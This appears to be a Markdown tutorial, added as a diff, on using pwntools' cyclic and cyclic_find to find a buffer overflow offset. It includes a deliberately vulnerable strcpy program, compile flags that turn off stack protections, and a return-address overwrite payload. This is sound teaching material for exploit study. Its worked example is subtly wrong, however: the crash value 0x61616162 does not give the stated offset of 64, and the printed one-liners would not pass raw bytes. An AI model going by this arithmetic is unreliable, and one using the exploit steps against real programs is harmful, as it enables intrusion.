@@ -1,0 +1,186 @@
+# Pwn cyclic
+
+
+# 👉 Overview
+
+---
+
+### 👀 What ?
+
+> Pwn cyclic is a technique used in cybersecurity for exploiting buffer overflow vulnerabilities. Buffer overflow is a common security issue where a program writes more data to a buffer than it can handle, which can overwrite adjacent memory areas. Pwn cyclic is a tool that can generate, search and slice cyclic patterns, which are patterns of distinct values that can be used to identify the exact location of buffer overflow.
+> 
+
+### 🧐 Why ?
+
+> Understanding Pwn cyclic is crucial for both cybersecurity professionals and software developers. For cybersecurity professionals, it's a powerful tool for identifying and exploiting vulnerabilities in software systems. For developers, understanding this technique can help them write more secure code by identifying potential buffer overflow vulnerabilities and ensuring their programs handle input data correctly. This knowledge is essential for anyone interested in maintaining secure systems.
+> 
+
+### ⛏️ How ?
+
+> To use Pwn cyclic, you first need to generate a cyclic pattern with a specified length. You can do this with the 'cyclic' function in the Pwn library. After an overflow occurs, you can use the 'cyclic_find' function to identify the exact location of the overflow. This allows you to pinpoint the exact place in the code where the overflow happened, making it easier to develop an exploit or fix the vulnerability.
+> 
+
+### ⏳ When ?
+
+> Pwn cyclic has been around for several years, and it has become an important tool in the toolkit of many cybersecurity professionals. Its use is particularly common in the field of penetration testing, where it is used to identify and exploit vulnerabilities in software systems.
+> 
+
+# ⚙️ Technical Explanations
+
+---
+
+### Overview
+
+Pwn cyclic is a tool used in exploit development to identify the exact location of a buffer overflow. It generates a sequence of unique patterns, which can be inputted into a program. If the program crashes due to a buffer overflow, the crash dump will contain part of this unique pattern. By analyzing the crash dump, you can pinpoint the exact offset where the buffer overflow occurred. This method is effective because each subset of the cyclic pattern is unique, allowing precise identification of the overflow point.
+
+### Steps to Use Pwn Cyclic
+
+### Step 1: Generate a Unique Pattern
+
+The first step is to generate a unique pattern using `cyclic` from the pwntools library. This pattern is designed so that every subset is unique.
+
+```python
+from pwn import *
+
+pattern = cyclic(100)
+print(pattern)
+
+```
+
+This generates a 100-byte long pattern.
+
+### Step 2: Input the Pattern into the Program
+
+Next, you input the generated pattern into the vulnerable program. This can be done by various means depending on the program's input method (e.g., command-line argument, environment variable, network input).
+
+```bash
+./vulnerable_program $(python -c 'from pwn import *; print(cyclic(100))')
+
+```
+
+### Step 3: Analyze the Crash Dump
+
+When the program crashes, the crash dump (e.g., core dump) will contain part of the cyclic pattern. You need to locate the exact part of the pattern present in the crash dump.
+
+### Step 4: Identify the Offset
+
+Using the pattern found in the crash dump, you can determine the exact offset of the buffer overflow using `cyclic_find`.
+
+```python
+from pwn import *
+
+# Example pattern from crash dump
+crash_pattern = b'aaab'
+
+offset = cyclic_find(crash_pattern)
+print(f"The offset is {offset}")
+
+```
+
+This will output the exact offset where the buffer overflow occurred.
+
+### Full Example
+
+Consider a vulnerable program that reads input into a fixed-size buffer without checking the length. Here is a simplified example:
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // Vulnerable to buffer overflow
+}
+
+int main(int argc, char *argv[]) {
+    if (argc > 1) {
+        vulnerable_function(argv[1]);
+    }
+    return 0;
+}
+
+```
+
+### Step-by-Step Process
+
+1. **Compile the Program**:
+    
+    ```bash
+    gcc -o vulnerable_program vulnerable_program.c -fno-stack-protector -z execstack
+    
+    ```
+    
+2. **Generate a Unique Pattern**:
+    
+    ```python
+    from pwn import *
+    
+    pattern = cyclic(100)
+    print(pattern)
+    
+    ```
+    
+3. **Run the Program with the Pattern**:
+    
+    ```bash
+    ./vulnerable_program $(python -c 'from pwn import *; print(cyclic(100))')
+    
+    ```
+    
+4. **Analyze the Crash Dump**:
+    - The program will crash, and you need to find the pattern in the crash dump. Assuming the crash dumps the EIP register:
+        
+        ```
+        Segmentation fault at EIP: 0x61616162
+        
+        ```
+        
+5. **Identify the Offset**:
+    
+    ```python
+    from pwn import *
+    
+    crash_pattern = 0x61616162  # The value from the crash dump
+    offset = cyclic_find(crash_pattern)
+    print(f"The offset is {offset}")
+    
+    ```
+    
+    - This will output:
+        
+        ```
+        The offset is 64
+        
+        ```
+        
+6. **Develop the Exploit**:
+    - With the offset known, you can craft a payload to exploit the buffer overflow, for example, by overwriting the return address.
+    
+    ```python
+    from pwn import *
+    
+    offset = 64
+    new_return_address = p32(0xdeadbeef)  # Example address
+    
+    payload = cyclic(offset) + new_return_address
+    print(payload)
+    
+    ```
+    
+    - Run the program with the crafted payload:
+        
+        ```bash
+        ./vulnerable_program $(python -c 'from pwn import *; print(cyclic(64) + p32(0xdeadbeef))')
+        
+        ```
+        
+
+### Conclusion
+
+Pwn cyclic is an essential tool in exploit development for accurately identifying the location of a buffer overflow. By generating unique patterns and analyzing crash dumps, you can precisely determine the offset of the overflow, facilitating the development of reliable exploits. This method highlights the importance of understanding memory layout and the impact of improper input handling in programs.
+
+# 🖇️ Références
+
+---
+
+- [https://docs.pwntools.com/en/latest/util/cyclic.html](https://docs.pwntools.com/en/latest/util/cyclic.html)
